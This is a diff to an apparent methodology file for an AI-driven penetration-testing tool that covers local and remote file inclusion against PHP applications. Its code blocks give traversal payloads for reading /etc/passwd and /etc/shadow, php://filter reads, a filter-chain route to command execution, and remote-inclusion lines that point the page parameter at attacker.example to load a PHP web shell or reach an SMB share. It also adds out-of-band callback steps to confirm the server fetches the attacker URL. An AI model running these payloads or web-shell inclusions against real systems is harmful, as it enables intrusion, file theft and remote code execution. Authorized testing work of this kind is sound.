@@ -18,6 +18,9 @@ origin: AI Threat Hunting
 
 - `aith assess kali exec -- curl ...` (manual path traversal probing and wrapper testing — all target-facing curl must go through the kali exec wrapper; use `--technique LFI --probe-kind payload --phase consume-test --timeout 30` for LFI attempts, `--technique RFI` for remote-file inclusion)
 - `aith assess kali ffuf ...` (automated traversal depth and path fuzzing — use `--technique LFI --probe-kind payload --phase consume-test --timeout 600`)
+- `aith assess classify-payload <value> --mutations` (type the `page=`/`file=` value and generate traversal/encoding variants — see "Type the Inclusion Parameter" below)
+- `aith assess anomaly-score <responses.jsonl>` (triage a traversal-depth fuzz sweep — rank the response population to find the depth that read the file; see "Triaging the Depth Sweep" below)
+- `aith oob mint` / `aith oob poll` (RFI only — mint a callback URL, point the inclusion at it, poll for the server-side fetch; see "Remote File Inclusion" below)
 - `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool — run host-side to generate payloads, then deliver via kali exec)
 
 ## Methodology
@@ -51,6 +54,34 @@ origin: AI Threat Hunting
 ?page=php://filter/convert.base64-encode/resource=index  # reads index.php
 ?page=../../../etc/passwd%00.php
 ```
+
+### Type the Inclusion Parameter
+
+Before hand-typing the traversal and encoding permutations above, classify the value the parameter currently carries (e.g. the default `page=about` or `file=report.pdf`) and let the oracle generate path-aware variants deterministically:
+
+```bash
+aith assess classify-payload "../uploads/report.pdf" --mutations   # type: path
+aith assess classify-payload "/var/www/page.php" --mutations       # type: path
+```
+
+Consume by intent bucket:
+
+- **`escalation`** — for a `path` value this yields `../../etc/passwd`, `../../../etc/shadow`, `/etc/passwd`, `/admin`, `/internal` (and, past the default 5-cap, the `%2F`-encoded traversal of the original and `value/..` — pass `--max-per-intent 7` to surface them). These are your first-pass traversal candidates.
+- **`format`** — yields the Windows-style `\`-separated form and the `%2F`-encoded form (the parser-confusion bypasses for filters that only match literal `../`).
+- **`boundary`** — `/`, `.`, `/etc/passwd`, `/proc/self/environ` probe how the include handler reacts to degenerate and well-known absolute paths.
+
+Each variant is a literal string for the parameter slot — deliver via the kali exec wrapper. This seeds the candidate list; the deeper traversal depths, null-byte, and overlong-UTF-8 variants still come from the directory-traversal payload reference (those are encoding families, not single typed values).
+
+### Triaging the Depth Sweep
+
+A traversal sweep walks `../`, `../../`, `../../../` … until one depth resolves to the target file — but a `ffuf`/curl batch returns dozens of near-identical 200s (the app's default page) plus the one hit (the file contents, a different size). Instead of eyeballing lengths, capture each response as a record and rank:
+
+```bash
+# one JSONL line per depth: {"url":"?page=../../../etc/passwd","status":200,"content_length":2841,"words":31,"lines":44}
+aith assess anomaly-score depth_sweep.jsonl --top 5
+```
+
+The depth that actually read `/etc/passwd` diverges from the default-page population on `length_bucket`, `words_bucket`, and `lines_bucket` — the oracle ranks it first and annotates which attribute flipped. Investigate the top outlier; confirm it is the file (look for `root:x:0:0:` in that response), not an error page of a different size. A flat ranking means no depth resolved the file: increase depth, switch encoding (the `format` variants above), or the parameter is not a filesystem include. This is the same triage pass for the `ffuf` output — pipe its results in rather than scrolling the match list.
 
 ## Sensitive Files
 
@@ -139,11 +170,29 @@ python3 php_filter_chain_generator.py --chain 'PAYLOAD: php system("id")'
 
 ## Remote File Inclusion (requires allow_url_include=On)
 
+Before serving a shell, confirm the server actually fetches an attacker URL — mint a nonce-tagged callback, point the parameter at it, and poll. The callback fires on the server-side fetch even when the response body does not reflect the included content (blind RFI / SSRF-via-include):
+
+```bash
+aith oob status --json
+aith oob mint --technique rfi --target-url "https://target/index.php" --param page --probe-kind http
+# -> http  http://<prefix>-<token>.oob.example.com/
 ```
+
+```
+?page=http://<prefix>-<token>.oob.example.com/      # confirm server-side fetch (blind RFI / include-SSRF)
 ?page=http://attacker.example/shell.txt    # shell.txt: PAYLOAD: php system($_GET['cmd'])
 ?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
+?page=\\<prefix>-<token>.oob.example.com\share\x   # SMB (Windows) — UNC fetch fires the callback even when allow_url_include is Off
 ?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
 ```
+
+Correlate the fetch instead of grepping the listener log:
+
+```bash
+aith oob poll --client <name> --json
+```
+
+A non-empty `matched` array for your nonce proves the server dereferenced your URL — `allow_url_include` is On (or the SMB/UNC path was followed). That confirms RFI/include-SSRF reach before you invest in hosting and delivering a shell payload. Empty `matched` → `allow_url_include` is Off and no UNC fetch happened; stay on the LFI path.
 
 ## What to Record
 
